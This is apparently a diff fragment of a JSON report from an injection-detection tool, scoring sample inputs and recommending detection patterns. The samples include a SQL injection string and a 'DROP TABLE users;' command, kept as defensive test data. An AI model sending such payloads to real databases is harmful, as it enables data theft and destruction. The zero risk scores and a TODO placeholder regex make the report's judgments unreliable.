+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    }
+  ],
+  "pattern_recommendations": [
+    {
+      "pattern": "high_special_char_ratio",
+      "frequency": 84,
+      "percentage": 55.26315789473685,
+      "priority": "HIGH",
+      "suggested_regex": "[^\\w\\s]{4,}",
+      "suggested_weight": 0.4
+    },
+    {
+      "pattern": "sql_keywords",
+      "frequency": 44,
+      "percentage": 28.947368421052634,
+      "priority": "MEDIUM",
+      "suggested_regex": "# TODO: Implement pattern for 'sql_keywords'",
+      "suggested_weight": 0.2
+    }
+  ]
+}
